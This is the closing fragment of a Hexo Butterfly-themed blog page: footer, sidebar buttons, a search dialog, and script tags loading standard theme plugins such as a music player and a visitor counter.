target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div class="aplayer no-destroy" data-id="000PeZCQ1i4XVs" data-server="tencent" data-type="artist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script></div></body></html>
